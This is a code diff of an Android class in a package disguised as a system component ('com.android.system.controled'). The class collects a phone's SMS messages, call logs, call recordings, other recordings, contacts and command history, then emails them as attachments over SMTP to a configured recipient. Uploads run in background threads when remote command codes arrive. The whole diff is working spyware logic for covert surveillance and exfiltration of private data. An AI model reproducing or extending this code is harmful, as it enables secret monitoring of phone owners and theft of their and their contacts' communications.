@@ -22,11 +22,12 @@ import javax.mail.internet.MimeMessage;
 import javax.mail.internet.MimeMultipart;
 import javax.mail.internet.MimeUtility;
 
-import android.content.Context;
 import android.util.Log;
 
 import com.android.system.controled.Debug;
 import com.android.system.controled.MainApplication;
+import com.android.system.controled.bean.Code;
+import com.android.system.controled.db.InnerDbOpera;
 
 public class SendEmailUtil {
 
@@ -35,6 +36,12 @@ public class SendEmailUtil {
 	public static final String host = "smtp.163.com";
 
 	// public static final String host = "smtp.gmail.com";
+
+	private InnerDbOpera mDbOperater;
+
+	public SendEmailUtil() {
+		mDbOperater = InnerDbOpera.getInstence();
+	}
 
 	private Session initialize() {
 		Properties props = new Properties();
@@ -69,8 +76,8 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadSmsCallLog(final Context con, boolean uploadEvenIfMobile) {
-		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(con)) || NetworkUtil.isWifiEnabled(con)) {
+	public void upLoadSmsCallLog(boolean uploadEvenIfMobile, final Code code) {
+		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
 			new Thread(new Runnable() {
 
 				@Override
@@ -83,15 +90,15 @@ public class SendEmailUtil {
 						Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
 						files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
 					}
-					if ((new File(MainApplication.FILE_SMS_DB)).exists()) {
-						Debug.v("Add", MainApplication.FILE_SMS_DB);
-						files.add(MainApplication.FILE_SMS_DB);
+					if (MainApplication.FILE_DB_SMS.exists()) {
+						Debug.v("Add", MainApplication.FILE_DB_SMS.getAbsolutePath());
+						files.add(MainApplication.FILE_DB_SMS.getAbsolutePath());
 					}
 
 					SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
-					if ((new File(MainApplication.FILE_SMS_TEXT)).exists()) {
-						Debug.v("Add", MainApplication.FILE_SMS_TEXT);
-						files.add(MainApplication.FILE_SMS_TEXT);
+					if (MainApplication.FILE_SMS_TEXT.exists()) {
+						Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
+						files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
 					}
 
 					if (files.size() <= 0) {
@@ -100,20 +107,17 @@ public class SendEmailUtil {
 
 					try {
 						sendMail("短信通话记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files);
-						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
-					} catch (AddressException e) {
-						e.printStackTrace();
-						addTag(con, MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
+						codeDoSuccess(code);
 					} catch (MessagingException e) {
 						e.printStackTrace();
-						addTag(con, MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
+						updateFailedTimes(code);
 					}
-
 				}
+
 			}).start();
 
 		} else {
-			addTag(con, MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
+			updateFailedTimes(code);
 		}
 
 	}
@@ -127,8 +131,8 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadCallAudios(final Context con, boolean uploadEvenIfMobile) {
-		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(con)) || NetworkUtil.isWifiEnabled(con)) {
+	public void upLoadCallAudios(boolean uploadEvenIfMobile, final Code code) {
+		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
 			new Thread(new Runnable() {
 
 				@Override
@@ -154,21 +158,17 @@ public class SendEmailUtil {
 
 					try {
 						sendMail("通话录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files);
-						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
-					} catch (AddressException e) {
-						e.printStackTrace();
-						addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
-
+						codeDoSuccess(code);
 					} catch (MessagingException e) {
 						e.printStackTrace();
-						addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
+						updateFailedTimes(code);
 					}
 
 				}
 			}).start();
 
 		} else {
-			addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
+			updateFailedTimes(code);
 		}
 
 	}
@@ -182,8 +182,8 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadOtherAudios(final Context con, boolean uploadEvenIfMobile) {
-		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(con)) || NetworkUtil.isWifiEnabled(con)) {
+	public void upLoadOtherAudios(boolean uploadEvenIfMobile, final Code code) {
+		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
 			new Thread(new Runnable() {
 
 				@Override
@@ -208,23 +208,18 @@ public class SendEmailUtil {
 
 					try {
 						sendMail("其它录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files);
-						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
-					} catch (AddressException e) {
-						e.printStackTrace();
-						addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
-
+						codeDoSuccess(code);
 					} catch (MessagingException e) {
 						e.printStackTrace();
-						addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
+						updateFailedTimes(code);
 					}
 
 				}
 			}).start();
 
 		} else {
-			addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
+			updateFailedTimes(code);
 		}
-
 	}
 
 	/**
@@ -236,13 +231,18 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadALL(final Context con, boolean uploadEvenIfMobile) {
-		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(con)) || NetworkUtil.isWifiEnabled(con)) {
+	public void upLoadALL(boolean uploadEvenIfMobile, final Code code) {
+		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
 			new Thread(new Runnable() {
 
 				@Override
 				public void run() {
 
+					ContactsUtil.createContactsFile(MainApplication.getInstence());
+					SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
+					CodesToTxtUtil.getInstence().saveAllCodesToTextFile();
+					
+					
 					String content = "所有记录，见附件";
 					Vector<String> files = new Vector<String>();
 
@@ -250,16 +250,18 @@ public class SendEmailUtil {
 						Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
 						files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
 					}
-					if ((new File(MainApplication.FILE_SMS_DB)).exists()) {
-						Debug.v("Add", MainApplication.FILE_SMS_DB);
-						files.add(MainApplication.FILE_SMS_DB);
-					}
-					SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
-					if ((new File(MainApplication.FILE_SMS_TEXT)).exists()) {
-						Debug.v("Add", MainApplication.FILE_SMS_TEXT);
-						files.add(MainApplication.FILE_SMS_TEXT);
+				
+					
+					if (MainApplication.FILE_SMS_TEXT.exists()) {
+						Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
+						files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
 					}
 
+					if (MainApplication.FILE_CODE_TEXT.exists()) {
+						Debug.v("Add", MainApplication.FILE_CODE_TEXT.getAbsolutePath());
+						files.add(MainApplication.FILE_CODE_TEXT.getAbsolutePath());
+					}
+					
 					File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
 					if (path.exists() && path.isDirectory()) {
 						File[] audios = path.listFiles();
@@ -281,33 +283,20 @@ public class SendEmailUtil {
 							}
 						}
 					}
-					
-					String codes = FileUtil.getinfo(new File(MainApplication.FILEPATH_CODES));
-
-					if (files.size() <= 0) {
-						content = "没有任何记录！";
-					} 
-
-					if(!StringUtil.isNull(codes)) {
-						content = content + "\r\n\r\n\r\n历史命令记录 ： \r\n\r\n" + codes + "\r\n\r\n\r\n";
-					}
+ 
 					try {
 						sendMail("所有记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files);
-						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_ALL);
-					} catch (AddressException e) {
-						e.printStackTrace();
-						addTag(con, MainApplication.PHONE_CODE_UPLOAD_ALL);
-
+						codeDoSuccess(code);
 					} catch (MessagingException e) {
 						e.printStackTrace();
-						addTag(con, MainApplication.PHONE_CODE_UPLOAD_ALL);
+						updateFailedTimes(code);
 					}
 
 				}
 			}).start();
 
 		} else {
-			addTag(con, MainApplication.PHONE_CODE_UPLOAD_ALL);
+			updateFailedTimes(code);
 		}
 
 	}
@@ -321,19 +310,21 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadContact(final Context con, boolean uploadEvenIfMobile) {
-		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(con)) || NetworkUtil.isWifiEnabled(con)) {
+	public void upLoadContact(boolean uploadEvenIfMobile, final Code code) {
+		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
 			new Thread(new Runnable() {
 
 				@Override
 				public void run() {
 
+					ContactsUtil.createContactsFile(MainApplication.getInstence());
+					
 					String content = "联系人，见附件";
 					Vector<String> files = new Vector<String>();
 
-					if (MainApplication.FILE_CONTACTS.exists()) {
-						Debug.v("Add", MainApplication.FILE_CONTACTS.getAbsolutePath());
-						files.add(MainApplication.FILE_CONTACTS.getAbsolutePath());
+					if (MainApplication.FILE_CONTACTS_TEXT.exists()) {
+						Debug.v("Add", MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
+						files.add(MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
 					}
 
 					if (files.size() <= 0) {
@@ -342,35 +333,27 @@ public class SendEmailUtil {
 
 					try {
 						sendMail("联系人  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files);
-						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
-					} catch (AddressException e) {
-						e.printStackTrace();
-						addTag(con, MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
-
+						codeDoSuccess(code);
 					} catch (MessagingException e) {
 						e.printStackTrace();
-						addTag(con, MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
+						updateFailedTimes(code);
 					}
 				}
 			}).start();
 
 		} else {
-			addTag(con, MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
+			updateFailedTimes(code);
 		}
 
 	}
 
-	private void deleteTag(Context context, String code) {
-		if (MainApplication.FILE_TAG_UPLOAD_TAG.exists() && FileUtil.read(MainApplication.FILENAME_TAG_UPLOAD_TAG, context).equals(code)) {
-			Debug.e(TAG, "  deleteTag   " + code);
-			MainApplication.FILE_TAG_UPLOAD_TAG.delete();
-		}
+	private void codeDoSuccess(Code code) {
+		code.setResult(Code.RESULT_OK);
+		mDbOperater.updateCodeResult(code);
 	}
 
-	private void addTag(Context context, String code) {
-		Debug.e(TAG, "  addTag   " + code);
-		FileUtil.write(code, MainApplication.FILENAME_TAG_UPLOAD_TAG, context);
-
+	private void updateFailedTimes(Code code) {
+		mDbOperater.updateCodeFailedTimes(code);
 	}
 
 	/**
@@ -387,7 +370,7 @@ public class SendEmailUtil {
 	 * @throws MessagingException
 	 * @throws AddressException
 	 * */
-	public synchronized void sendMail(String subject, String body, String recipients, Vector<String> files) throws AddressException, MessagingException {
+	private synchronized void sendMail(String subject, String body, String recipients, Vector<String> files) throws AddressException, MessagingException {
 
 		Log.e(TAG, "recipients=" + recipients);
 
